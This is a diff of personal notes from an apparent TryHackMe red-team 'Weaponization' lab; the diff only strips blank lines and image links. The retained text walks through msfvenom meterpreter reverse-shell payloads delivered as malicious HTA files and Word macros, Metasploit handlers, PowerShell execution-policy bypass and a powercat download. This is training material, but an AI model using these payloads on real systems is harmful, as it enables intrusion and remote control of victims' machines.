@@ -29,7 +29,6 @@ Most organizations block or monitor the execution of .exe files within their con
     Visual Basic Applications (VBA)
     PowerShell (PSH)
 
-
 Let's deploy the target machine in the next task, and we'll get started with the Windows Script Host technique in the subsequent task!
 *No answer needed*
 
@@ -96,7 +95,6 @@ Terminal
            
 c:\Windows\System32>cscript.exe c:\Users\thm\Desktop\payload.vbs
 
-
 ```
 
 As a result, the Windows calculator will appear on the Desktop.
@@ -117,18 +115,8 @@ The result will be as exact as executing the vbs files, which run the calc.exe b
 
 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/f6d6a5f824fa64750e8b15ce6ba07a7a.png)
 
-
 Try to replace the calc.exe binary to execute cmd.exe within the Windows machine.
 *No answer needed*
-
-![[Pasted image 20220909223152.png]]
-
-![[Pasted image 20220909225052.png]]
-
-![[Pasted image 20220909225445.png]]
-
-![[Pasted image 20220909225616.png]]
-
 
 ### An HTML Application - HTA 
 
@@ -158,10 +146,7 @@ Terminal
 user@machine$ python3 -m http.server 8090
 Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/)
 
-
 ```
-
-![[Pasted image 20220909230849.png]]
 
 On the victim machine, visit the malicious link using Microsoft Edge, http://10.8.232.37:8090/payload.hta. Note that the 10.8.232.37 is the AttackBox's IP address.
 
@@ -186,7 +171,6 @@ No encoder specified, outputting raw payload
 Payload size: 460 bytes
 Final size of hta-psh file: 7692 bytes
 Saved as: thm.hta
-
 
 ```
 
@@ -213,7 +197,6 @@ ipconfig
 
 Windows IP Configuration
 
-
 Ethernet adapter Ethernet 4:
 
    Connection-specific DNS Suffix  . : eu-west-1.compute.internal
@@ -222,10 +205,7 @@ Ethernet adapter Ethernet 4:
    Subnet Mask . . . . . . . . . . . : 255.255.0.0
    Default Gateway . . . . . . . . . : 10.10.0.1
 
-
 ```
-
-![[Pasted image 20220909231314.png]]
 
 Malicious HTA via Metasploit 
 
@@ -251,7 +231,6 @@ msf6 exploit(windows/misc/hta_server) >
 [*] Started reverse TCP handler on 10.8.232.37:443
 [*] Using URL: http://10.8.232.37:8080/TkWV9zkd.hta
 [*] Server started.
-
 
 ```
 
@@ -283,9 +262,7 @@ Microsoft Windows [Version 10.0.14393]
 
 C:\app>
 
-
 ```
-
 
 Now, apply what we discussed to receive a reverse connection using the user simulation machine in the Practice Arena task.
 *No answer needed*
@@ -338,10 +315,6 @@ Sub THM()
 End Sub
 ```
 
-![[Pasted image 20220909232322.png]]
-
-![[Pasted image 20220909232339.png]]
-
 It is important to note that to make the macro work, we need to save it in Macro-Enabled format such as .doc and docm. Now let's save the file as Word 97-2003 Template where the Macro is enabled by going to File → save Document1 and save as type → Word 97-2003 Document and finally, save.
 
 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/a5e35b7436173da709dae5695c34d4f9.png)
@@ -349,9 +322,6 @@ It is important to note that to make the macro work, we need to save it in Macro
 Let's close the Word document that we saved. If we reopen the document file, Microsoft Word will show a security message indicating that Macros have been disabled and give us the option to enable it. Let's enable it and move forward to check out the result.
 
 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/e140bfbce59d6cf3e71489dba094adc2.png)
-
-
-![[Pasted image 20220909233719.png]]
 
 Once we allowed the Enable Content, our macro gets executed as shown,
 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/ca228c238732dcdf21139317992a0083.png)
@@ -370,13 +340,9 @@ To explain the code in detail, with Dim payload As String, we declare payload va
 
 Make sure to test your code before saving the document by using the running feature in the editor. Make sure to create AutoOpen() and Document_open() functions before saving the document. Once the code works, now save the file and try to open it again.
 
-![[Pasted image 20220909234315.png]]
-
 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/5c80382621d3fcb578a9e128ca821e71.png)
 
 It is important to mention that we can combine VBAs with previously covered methods, such as HTAs and WSH. VBAs/macros by themselves do not inherently bypass any detections.
-
-
 
 Now let's create an in-memory meterpreter payload using the Metasploit framework to receive a reverse shell. First, from the AttackBox, we create our meterpreter payload using msfvenom. We need to specify the Payload, LHOST, and LPORT, which match what is in the Metasploit framework. Note that we specify the payload as VBA to use it as a macro.
 
@@ -390,7 +356,6 @@ user@AttackBox$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.159.15 L
 No encoder specified, outputting raw payload
 Payload size: 341 bytes
 Final size of vba file: 2698 bytes
-
 
 ```
 
@@ -419,7 +384,6 @@ msf5 exploit(multi/handler) > exploit
 
 [*] Started reverse TCP handler on 10.50.159.15:443 
 
-
 ```
 
 Once the malicious MS word document is opened on the victim machine, we should receive a reverse shell.
@@ -434,7 +398,6 @@ msf5 exploit(multi/handler) > exploit
 [*] Sending stage (176195 bytes) to 10.10.215.43
 [*] Meterpreter session 1 opened (10.50.159.15:443 -> 10.10.215.43:50209) at 2021-12-13 10:46:05 +0000
 meterpreter >
-
 
 ```
 
@@ -479,14 +442,9 @@ Sub Workbook_Open()
         Auto_Open
 End Sub
 
-
-
 ```
 
 change Workbook_Open to (Document_Open ), with netcat works but for a little of time, with metasploit it's better.
-![[Pasted image 20220909235947.png]]
-
-
 
 ### PowerShell - PSH 
 
@@ -513,7 +471,6 @@ information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?Lin
 
 C:\Users\thm\Desktop>
 
-
 ```
 
 Execution Policy
@@ -527,7 +484,6 @@ You can determine the current PowerShell setting of your Windows as follows,
            
 PS C:\Users\thm> Get-ExecutionPolicy
 Restricted
-
 
 ```
 
@@ -555,7 +511,6 @@ In order to make sure our PowerShell file gets executed, we need to provide the 
            
 C:\Users\thm\Desktop>powershell -ex bypass -File thm.ps1
 Welcome to Weaponization Room!
-
 
 ```
 
@@ -586,7 +541,6 @@ user@machine$ cd powercat
 user@machine$ python3 -m http.server 8080
 Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
  
-
 
 ```
 
@@ -623,10 +577,6 @@ C:\Users\thm>
 Apply what you learned in this task. In the next task, we will discuss Command and Control frameworks! 
 *No answer needed*
 
-![[Pasted image 20220910105545.png]]
-
-![[Pasted image 20220910105733.png]]
-
 ```
 ──(kali㉿kali)-[~]
 └─$ git clone https://github.com/besimorhino/powercat.git
@@ -658,13 +608,6 @@ Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
 10.10.129.90 - - [10/Sep/2022 11:58:49] "GET /powercat.ps1 HTTP/1.1" 200 -
 ```
 
-
-![[Pasted image 20220910105938.png]]
-
-![[Pasted image 20220910110106.png]]
-
-
-
 ### Command And Control - (C2 Or C&C) 
 
 This task introduces the basic concept of Command and Control (C2) frameworks used in Red team operations.
@@ -681,9 +624,7 @@ C2 frameworks are post-exploitation frameworks that allow red teamers to collabo
     Lateral movement 
     And many others
 
-
 Some popular C2 frameworks that we'll briefly highlight are Cobalt Strike, PowerShell Empire, Metasploit. Most of these frameworks aim to support a convenient environment to share and communicate between red team operations once the initial access is gained to a system.
-
 
 Cobalt Strike
 
@@ -737,9 +678,6 @@ Often, organizations establish strong policies such as disabling USB usage withi
 
 Common USB attacks used to weaponize USB devices include [Rubber Ducky](https://shop.hak5.org/products/usb-rubber-ducky) and [USBHarpoon](https://www.minitool.com/news/usbharpoon.html), charging USB cable.
 
-
-
-
 Which method is used to distribute payloads to a victim at social events?
 *USB Delivery*
 
@@ -757,9 +695,6 @@ Note for Doc files: the simulation used in the provided Windows 10 machine will 
 
 In the Metasploit framework, we can inject our current process into another process on the victim machine using migrate. In our case, we need to migrate our current process, which is the MS word document, into another process to make the connection stable even if the MS word document is closed. The easiest way to do this is by using migrate post-module as follow,
 
-![[Pasted image 20220910113426.png]]
-![[Pasted image 20220910113437.png]]
-
 ```
 Terminal
 
@@ -773,13 +708,11 @@ meterpreter > run post/windows/manage/migrate
 [*] Migrating into 4960
 [+] Successfully migrated into process 4960
 
-
 ```
 
 In this task, the goal is to generate a reverse shell payload of your choice and send it through the web application. Once the web application runs your payload, you should receive a connect back. Answer the question below and prove your access by finding the flag once you receive a reverse shell.
 
 For reference, you can use the MSFVenom Cheat Sheet on this [website](https://thedarksource.com/msfvenom-cheat-sheet-create-metasploit-payloads/).
-
 
 What is the flag? Hint: Check the user desktop folder for the flag!
 (The easiest way to get reverse-shell is by applying the technique discussed in Task 4, which creates a malicious HTA link using Metasploit.)
